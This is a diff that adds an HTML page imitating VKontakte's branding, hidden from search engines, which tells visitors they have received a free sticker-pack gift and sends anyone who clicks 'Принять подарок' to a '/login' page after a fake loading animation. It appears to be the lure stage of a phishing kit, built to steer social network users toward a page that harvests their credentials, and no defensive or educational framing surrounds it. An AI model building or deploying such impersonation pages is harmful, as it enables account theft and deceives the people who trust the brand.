@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href=""><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                                                    <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 28 28"><path d="M0 14C0 6.268 6.268 0 14 0s14 6.268 14 14-6.268 14-14 14S0 21.732 0 14z" fill="#ffae24"></path><path d="M12.609 16.5c.223 0 .304.023.385.067s.146.107.19.189.066.162.066.385v3.218c0 .223-.023.304-.067.385s-.107.146-.189.19c-.081.043-.162.066-.385.066h-2.007c-.557 0-.759-.058-.963-.167-.203-.109-.363-.269-.472-.473S9 19.955 9 19.398V17.14c0-.223.023-.304.067-.385.043-.082.107-.146.189-.19s.162-.066.385-.066zm5.75 0c.223 0 .304.023.385.067s.146.107.19.189.066.162.066.385v2.248c0 .556-.058.758-.166.961s-.268.363-.471.472c-.203.11-.405.168-.961.17l-2.15.006a.5.5 0 01-.494-.408l-.008-.09V17.14c0-.223.023-.304.067-.385s.107-.146.189-.19.162-.066.385-.066zm-5.75-5.5c.223 0 .304.023.385.067s.146.107.19.189.066.162.066.385v2.718c0 .223-.023.304-.067.385s-.107.146-.189.19c-.081.043-.162.066-.385.066H8.641c-.223 0-.304-.023-.385-.067a.454.454 0 01-.19-.189C8.024 14.663 8 14.582 8 14.36v-1.757c0-.557.058-.759.167-.963s.269-.363.472-.472c.204-.11.406-.167.963-.167zm5.789 0c.557 0 .759.058.963.167.203.109.363.269.472.472.109.204.167.406.167.963v1.757c0 .223-.023.304-.067.385s-.107.146-.189.19c-.081.043-.162.066-.385.066h-3.968c-.223 0-.304-.023-.385-.067-.082-.043-.146-.107-.19-.189s-.066-.162-.066-.385V11.64c0-.223.023-.304.067-.385s.107-.146.189-.19.162-.066.385-.066zM14 10c-4.25 0-4.75-2.75-3.75-3.75S14 5.75 14 10zm0 0c0-4.25 2.75-4.752 3.75-3.752S18.25 10 14 10z" fill="#fff"></path></svg>
+                <h1 class="title">Пользователь отправил вам подарок</h1>
+                <p class="subtitle">Вы получили подарок от пользователя. Подарок «‎Случайный стикерпак», после получения вы можете его использовать.</p>
+                <button type="button" class="button"><span>Принять подарок</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                                    </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
